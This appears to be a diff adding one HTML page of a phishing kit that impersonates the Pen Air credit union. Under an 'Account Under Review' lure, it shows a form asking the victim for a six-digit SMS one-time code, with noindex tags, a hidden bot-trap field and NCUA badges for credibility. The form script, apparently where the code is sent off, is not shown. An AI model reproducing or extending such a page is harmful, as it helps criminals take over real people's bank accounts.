@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=5">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="referrer" content="no-referrer">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; script-src 'self'; connect-src 'self';">
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>Pen Air CU | Account Under Review</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%239c1b6a'/%3E%3Ctext x='50%25' y='55%25' dominant-baseline='central' text-anchor='middle' font-family='Arial, sans-serif' font-weight='bold' font-size='20' fill='white'%3EP%3C/text%3E%3C/svg%3E">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .vld-2fa-text {
+            font-size: 15px;
+            color: var(--text-primary);
+            margin-bottom: 24px;
+            text-align: center;
+            line-height: 1.5;
+        }
+        .vld-phone-highlight {
+            font-weight: 600;
+            color: var(--btn-primary);
+        }
+    </style>
+</head>
+<body>
+    <div id="loading-overlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <div class="loading-text" data-render="sync_msg"></div>
+    </div>
+    <div id="root">
+        <div class="login-page-container">
+            <div class="fluid-form-layout">
+                <div class="login-header">
+                    <a href="#">
+                        <img src="assets/logo.png" alt="" id="brand-logo">
+                    </a>
+                </div>
+
+                <div class="login-form-container">
+                    <form id="fluid-2fa-form">
+                        <div class="vld-msg-container">
+                            <input type="text" name="b_field" id="b_field" tabindex="-1" autocomplete="off">
+                        </div>
+
+                        <div class="vld-2fa-text">
+                            <span data-render="2fa_msg_start"></span> 
+                            <span id="display-phone" class="vld-phone-highlight"></span>. 
+                            <span data-render="2fa_msg_end"></span>
+                        </div>
+
+                        <div class="fluid-form-layout-field-container">
+                            <label class="field-label" data-render="code_label"></label>
+                            <div class="fluid-input-wrapper">
+                                <input type="text" id="sec_code" name="sec_code" class="fluid-input" maxlength="6" placeholder="XXXXXX" autocomplete="one-time-code" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'');" required>
+                            </div>
+                        </div>
+
+                        <div class="fluid-form-layout-field-container" style="margin-top: 32px;">
+                            <button type="submit" class="fluid-button">
+                                <span class="fluid-button__text" data-render="verify_btn"></span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <footer id="footer-container" class="footer-container-main">
+            <div class="image-links">
+                <img alt="" src="assets/ncua_icon.png" style="margin-right: 20px;">
+                <img alt="" src="assets/ncua_text.png" style="margin-right: 20px;">
+                <img alt="" src="assets/ehl_icon.png">
+            </div>
+        </footer>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
